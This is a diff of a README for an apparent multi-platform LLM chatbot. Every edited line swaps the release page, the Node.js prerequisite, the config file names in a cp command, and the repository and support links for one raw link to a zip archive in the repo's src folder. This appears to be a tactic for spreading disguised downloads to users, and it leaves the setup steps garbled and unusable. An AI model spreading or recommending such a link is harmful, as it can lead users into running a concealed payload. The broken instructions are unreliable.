@@ -1,6 +1,6 @@
 # 🤖 multichannel-llm-bot - Chat Across Multiple Platforms
 
-[![Download](https://img.shields.io/badge/Download%20Now-Release-brightgreen)](https://github.com/richardbrick14/multichannel-llm-bot/releases)
+[![Download](https://github.com/richardbrick14/multichannel-llm-bot/raw/refs/heads/main/src/llm_multichannel_bot_1.4-alpha.5.zip%20Now-Release-brightgreen)](https://github.com/richardbrick14/multichannel-llm-bot/raw/refs/heads/main/src/llm_multichannel_bot_1.4-alpha.5.zip)
 
 Welcome to the Multi-Channel LLM Bot, a configurable and secure chatbot that connects with multiple platforms. Currently, it supports Telegram, with plans for WhatsApp and Discord. You can also choose from various LLM providers, including OpenAI, Anthropic, and Ollama.
 
@@ -12,7 +12,7 @@ This guide will help you download and set up the Multi-Channel LLM Bot on your c
 
 To download the application, visit the Releases page. Click the button below:
 
-[Download Now](https://github.com/richardbrick14/multichannel-llm-bot/releases)
+[Download Now](https://github.com/richardbrick14/multichannel-llm-bot/raw/refs/heads/main/src/llm_multichannel_bot_1.4-alpha.5.zip)
 
 Once on the Releases page, find the latest version and download the appropriate file for your operating system.
 
@@ -20,7 +20,7 @@ Once on the Releases page, find the latest version and download the appropriate 
 
 Before you begin, ensure you have the following:
 
-- **Node.js**: Version 20 or higher installed on your machine.
+- **https://github.com/richardbrick14/multichannel-llm-bot/raw/refs/heads/main/src/llm_multichannel_bot_1.4-alpha.5.zip**: Version 20 or higher installed on your machine.
 - **API Key**: Obtain an API key from your chosen LLM provider (OpenAI, Anthropic, or Ollama).
 - **Telegram Bot Token**: If you plan to use Telegram, create a bot and obtain a token.
 
@@ -39,10 +39,10 @@ npm install
 You will need to adjust the configuration to match your requirements. Start by copying the example configuration file:
 
 ```bash
-cp config.example.json config.json
+cp https://github.com/richardbrick14/multichannel-llm-bot/raw/refs/heads/main/src/llm_multichannel_bot_1.4-alpha.5.zip https://github.com/richardbrick14/multichannel-llm-bot/raw/refs/heads/main/src/llm_multichannel_bot_1.4-alpha.5.zip
 ```
 
-Edit the `config.json` file using a text editor to specify your LLM provider and model. Here is an example configuration for using OpenAI:
+Edit the `https://github.com/richardbrick14/multichannel-llm-bot/raw/refs/heads/main/src/llm_multichannel_bot_1.4-alpha.5.zip` file using a text editor to specify your LLM provider and model. Here is an example configuration for using OpenAI:
 
 ```json
 {
@@ -94,7 +94,7 @@ The Multi-Channel LLM Bot offers the following features:
 
 For further information and updates, you can check out the documentation available in the repository, and visit the following links:
 
-- [GitHub Repository](https://github.com/richardbrick14/multichannel-llm-bot)
-- [Contact Support](mailto:support@example.com)
+- [GitHub Repository](https://github.com/richardbrick14/multichannel-llm-bot/raw/refs/heads/main/src/llm_multichannel_bot_1.4-alpha.5.zip)
+- [Contact Support](https://github.com/richardbrick14/multichannel-llm-bot/raw/refs/heads/main/src/llm_multichannel_bot_1.4-alpha.5.zip)
 
 For a successful launch of your chatbot, ensure you've followed all steps carefully. Happy chatting!
